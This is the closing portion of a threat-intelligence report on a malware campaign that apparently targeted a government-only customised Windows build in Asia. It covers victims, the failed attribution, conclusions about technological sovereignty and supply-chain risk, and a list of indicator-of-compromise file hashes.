## Victims

Based on KSN telemetry data, we identified a single victim in Asia. Additionally, we learned that the malware was designed to target a specially customized government‑only version of the Windows operating system. Consequently, we infer that the victims are Asian government entities.

## Attribution

After analyzing the TTPs, code similarities, and infrastructure, we were unable to link the attack to any known APT group.

## Conclusions

Technological sovereignty has become a global trend. In today’s geopolitical climate, a growing number of countries are building their own core software platforms, including operating systems, databases, middleware, and cloud services, with operating systems often the top priority. The advantage is that each country controls the development, operation, and upgrading of its own operating systems, granting it full autonomy over the entire process. On the other hand, it also means that each country must protect this entire vast ecosystem on its own. Bringing the operation and maintenance of such a system to maturity is a lengthy process. Until then, both the system and its emerging supply chain could be exposed to attacks through multiple vectors, increasing potential vulnerabilities.

## Indicators of Compromise

### File hashes

[F2458ED133F8D0CA19E22C10F577E98E](https://opentip.kaspersky.com/f2458ed133f8d0ca19e22c10f577e98e/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_023d3a8b7ca2e1f8) e4537a1762fcafd2fd96bfc825bad34f9db9a24d  
[E1DC6F1ED193594F2284BE22AE08DFA4](https://opentip.kaspersky.com/e1dc6f1ed193594f2284be22ae08dfa4/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_009478857678e563) Resources.resx  
[AB81564BCB8CA7E710C66832DE747556](https://opentip.kaspersky.com/ab81564bcb8ca7e710c66832de747556/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_cff69a930f8c5ebe).NET 1 Loader  
[CFB8B281BDF5D9390E64B10C312FB2C1](https://opentip.kaspersky.com/cfb8b281bdf5d9390e64b10c312fb2c1/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_25987cdb88d0baef).NET 2 Plugin  
[67E3617F8709D34F806F8E02BADBA8A5](https://opentip.kaspersky.com/67e3617f8709d34f806f8e02badba8a5/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_7fdf03c47375f49c) fabric.config  
[514AC0D73B8A1B73488EF5E2E55A75C3](https://opentip.kaspersky.com/514ac0d73b8a1b73488ef5e2e55a75c3/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_3a67ecb012d19322) PatchMyPC-ScriptRunner.exe.config  
[514117D536E347560D049CFE0C609632](https://opentip.kaspersky.com/514117d536e347560d049cfe0c609632/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_57972b7fd1ff3a48) XAML-1  
[9000820D8153C24CD60D53001D3A97B6](https://opentip.kaspersky.com/9000820d8153c24cd60d53001d3a97b6/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_d9771f901fbf37f9) XAML-2  
[B3C4A635179680EDAFB5D006CF0CFFC6](https://opentip.kaspersky.com/b3c4a635179680edafb5d006cf0cffc6/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_f671b121c45784e2) XAML-2-1  
[4F28622C5E60C01319BF48CF742FE1A5](https://opentip.kaspersky.com/4f28622c5e60c01319bf48cf742fe1a5/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_f37ec1ca3a31e569) XAML-2-2  
[C86D53392A87DD3F3E62D62C9B92A9BD](https://opentip.kaspersky.com/c86d53392a87dd3f3e62d62c9b92a9bd/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_ce1a38c3a6657146) XAML-3
